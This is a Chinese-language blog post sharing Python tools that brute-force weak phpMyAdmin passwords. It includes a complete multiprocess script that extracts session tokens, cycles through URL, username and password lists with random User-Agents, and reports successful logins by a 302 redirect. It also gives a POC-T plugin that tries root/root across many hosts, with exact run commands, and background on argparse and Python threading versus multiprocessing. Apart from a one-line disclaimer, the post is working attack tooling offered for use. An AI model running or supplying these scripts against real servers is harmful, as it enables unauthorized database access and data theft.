---
title: "python多进程&amp;多线程爆破phpmyadmin弱密码"
categories: [ "Python","工具分享" ]
tags: [ "Python","phpmyadmin","弱密码","爆破","多线程","多进程" ]
draft: false
slug: "416"
date: "2019-12-29 17:33:00"
---

## 事情起因

**本代码仅供测试使用，读者自行使用造成的后果与本人无关！**

test404 大佬网站也关闭了，他的 phpMyAdmin 多线程批量破解工具最后更新到了`v2.3`

但是也不太好用：

![][1]

网上找的代码不太好用，自己写一个

## 一些说明

### 验证的核心代码

我在网上找了好多文章，发现核心部分都是检验发送构造的账号密码请求登陆后页面里独有的关键字

比如`bypass`大佬以前写的脚本是检测`login_form`字段:

![][2]

有检测`pma_password`字段的：

![][3]

甚至还有检测`phpMyAdmin is more friendly with a`的，这个在正确密码和不正确密码界面都检测不出来：

![][4]

看来看去还是觉得体验盒子上的[这篇文章][5]看起来靠谱一点(虽然后面也不怎么靠谱)

核心的实现方法是用`requests`请求时用`session()`方法保持住会话，获得会话的`id`和本次的`token`

然后加上账号密码再`post`出去，保持 id 和 token 在发送过程中没有发生变化

### 命令行参数设置

第一次接触到在写功能性的脚本时添加参数，虽然这个参数可有可无

就是加了一个挂载字典的`-p`选项，命令行参数设置一般有三种著名方法

1.sys.argv+getopt

其实就是简单的字符串分离，完全没有技术含量：

![][6]

2.argparse

被很多人推荐，我用下来也蛮好用的

![][7]

推荐文章

- [Python 命令行参数解析库 argparse][8]
- [argparse --- 命令行选项、参数和子命令解析器][9](官方文档)

  3.click

> Click 是 Flask 的团队 pallets 开发的优秀开源项目，它为命令行工具的开发封装了大量方法，使开发者只需要专注于功能实现。这是一个第三方库，专门为了命令行而生的非常有名的 Python 命令行模块。

![][10]

用到了装饰器，看着有点慌，就没用了

### 关于多线程/多进程

廖雪峰关于多线程不能有效使用 CPU 的[解释][11]：

> Python 的线程虽然是真正的线程，但解释器执行代码时，有一个 GIL 锁：Global Interpreter Lock，任何 Python 线程执行前，必须先获得 GIL 锁，然后，每执行 100 条字节码，解释器就自动释放 GIL 锁，让别的线程有机会执行。这个 GIL 全局锁实际上把所有线程的执行代码都给上了锁，所以，多线程在 Python 中只能交替执行，即使 100 个线程跑在 100 核 CPU 上，也只能用到 1 个核。

> GIL 是 Python 解释器设计的历史遗留问题，通常我们用的解释器是官方实现的 CPython，要真正利用多核，除非重写一个不带 GIL 的解释器。

> 所以，在 Python 中，可以使用多线程，但不要指望能有效利用多核。如果一定要通过多线程利用多核，那只能通过 C 扩展来实现，不过这样就失去了 Python 简单易用的特点。

> 不过，也不用过于担心，Python 虽然不能利用多线程实现多核任务，但可以通过多进程实现多核任务。多个 Python 进程有各自独立的 GIL 锁，互不影响。

简单的来说，就是 Python 要利用多核的话只能使用多进程

在这篇多线程和多进程比较的文章：[Python 中单线程、多线程与多进程的效率对比实验][12]中

可以得出一个结论：

> 多线程在 CPU 密集型的操作下明显地比单线程线性执行性能更差，但是对于网络请求这种忙等阻塞线程的操作，多线程的优势便非常显著了
> 多进程无论是在 CPU 密集型还是 IO 密集型以及网络请求密集型（经常发生线程阻塞的操作）中，都能体现出性能的优势。不过在类似网络请求密集型的操作上，与多线程相差无几，但却更占用 CPU 等资源，所以对于这种情况下，我们可以选择多线程来执行

用到我本次的实现过程中，就一句话：

**多线程多进程效率差不多，但是多进程在 CPU 资源占用上非常瞩目**

## 多进程全代码

我这里先写了多进程版的`python phpmyadmin爆破脚本`，全代码如下：

```
#!/usr/bin/env/python
# -*- coding: utf-8 -*-
'''
@author: soapffz
@fucntion: 多进程爆破phpmyadmin密码(支持挂载字典)
@time: 2019-12-28
'''

import requests
import os
from multiprocessing.pool import Pool
import time
import sys
import argparse
from fake_useragent import UserAgent
import re
import timeit


class multi_phpmyadmin_verification:
    def __init__(self):
        args = self.argparse(sys.argv[1:])
        if not args.p:
            self.passwd_l = open("password.txt").read().splitlines()
        elif not os.path.exists(args.p) or not os.path.isfile(args.p):
            print("path does not exist,quit")
            exit(0)
        else:
            self.passwd_l = args.p
        os.chdir(os.path.dirname(os.path.abspath(__file__)))
        self.urls_l = open("url.txt").read().splitlines()
        self.username_l = open("username.txt").read().splitlines()
        self.multi_thread()

    def argparse(self, argv):
        # Parsing parameters
        parser = argparse.ArgumentParser()  # Create a parse object
        parser.add_argument(
            "-p", type=str, metavar="dic_path", help="Dictionary path")
        return parser.parse_args(argv)

    def multi_thread(self):
        ua = UserAgent()  # Used to generate User-Agent
        self.headers = {"User-Agent": ua.random}  # Get a random User-Agent
        pool = Pool()
        for url in self.urls_l:
            for username in self.username_l:
                for passwd in self.passwd_l:
                    pool.apply_async(self.verify, args=(
                        url, username, passwd,))
        pool.close()
        pool.join()

    def verify(self, url, username, passwd):
        time.sleep(0.01)
        print("\r 当前url:{}，当前用户名:{}，当前密码:{}".format(
            url, username, passwd), end="")
        # Use the \ r parameter to refresh the current line output
        session = requests.session()
        r1 = session.get(url)
        if r1.status_code != 200:
            return
        session_id = re.findall(r'phpMyAdmin=(.*?);', r1.headers['Set-Cookie'])
        token = list(re.compile(
            r'name=\"token\" value=\"(.*?)\"').findall(r1.text))[0]
        payload = {"set_session": session_id, "pma_username": username,
                   "pma_password": passwd, "server": "1", "target": "index.php", "token": token}
        r2 = session.post(url, data=payload,
                          allow_redirects=False, headers=self.headers)
        if r2.status_code == 302:
            print("\n Succeeded!!!url:{},username:{},password:{}".format(
                url, username, passwd))


if __name__ == "__main__":
    start_time = timeit.default_timer()
    multi_phpmyadmin_verification()
    end_time = timeit.default_timer()
    print("\n 程序运行结束，总用时:{}".format(end_time-start_time))
```

使用方法：

- 在代码同目录创建`url.txt`,`username.txt`,`password.txt`，分别把需要爆破的`url`，用户名和密码对应写入
- 分别`pip install`这些库：

```
requests
multiprocessing
argparse
fake_useragent
timeit
```

- `python phpmyadmin.py`运行代码，可以加一个`-p`参数，后面接字典的路径

运行效果如下：

![][13]

`cpu`占用率瞩目：

![][14]

进程池是根据你的`cpu`个数自动设置的，你觉得占用太高的话，手动在`pool = Pool()`

这行的括号里填写想要的数值即可，最大只能为你的`cpu`核数，可以减小一点就不会占满`cpu`了。

## 多线程版本

[2020-02-12 更新]

可以使用`POC-T`框架来管理多线程，具体可以参考[github][15]

把以下代码存储为`phpmyadmin-weakpass.py`放到`POC-T`的`script`文件夹内：

```
# -*- coding: utf-8 -*-
import requests
import re


def poc(url_dict):
    try:
        session = requests.session()
        req = session.get(url_dict)
        if req.status_code == 200:
            session_id = re.findall(
                r'phpMyAdmin=(.*?);', req.headers['Set-Cookie'])
            token = list(re.compile(
                r'name=\"token\" value=\"(.*?)\"').findall(req.text))[0]
            headers = {"Upgrade-Insecure-Requests": "1",
                       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Edg/80.0.361.50", "Connection": "close"}
            paramsPost = {"set_session": session_id, "pma_username": "root",
                          "pma_password": "root", "server": "1", "target": "index.php", "token": token}
            r2 = session.post(url_dict, data=paramsPost,
                              allow_redirects=False, headers=headers)
            if r2.status_code == 302:
                return url_dict
    except:
        return False
```

使用如下：

```
python POC-T.py -s phpmyadmin-weakpass -t 100 -iF urls.txt -o first.txt
```

效果如下：

![][16]

[1]: https://img.soapffz.com/archives_img/2019/12/29/archives_20191229_174438.png
[2]: https://img.soapffz.com/archives_img/2019/12/29/archives_20191229_174718.png
[3]: https://img.soapffz.com/archives_img/2019/12/29/archives_20191229_180452.png
[4]: https://img.soapffz.com/archives_img/2019/12/29/archives_20191229_180719.png
[5]: https://www.uedbox.com/post/57884/
[6]: https://img.soapffz.com/archives_img/2019/12/29/archives_20191229_182458.png
[7]: https://img.soapffz.com/archives_img/2019/12/29/archives_20191229_183038.png
[8]: https://cloud.tencent.com/developer/article/1471274
[9]: https://docs.python.org/zh-cn/3.8/library/argparse.html
[10]: https://img.soapffz.com/archives_img/2019/12/29/archives_20191229_182703.png
[11]: https://www.liaoxuefeng.com/wiki/1016959663602400/1017629247922688
[12]: http://blog.atomicer.cn/2016/09/30/Python%E4%B8%AD%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AF%B9%E6%AF%94/
[13]: https://img.soapffz.com/archives_img/2019/12/29/archives_20191229_184546.png
[14]: https://img.soapffz.com/archives_img/2019/12/29/archives_20191229_184451.png
[15]: https://github.com/Xyntax/POC-T
[16]: https://img.soapffz.com/archives_img/2019/12/29/archives_20200212_172155.png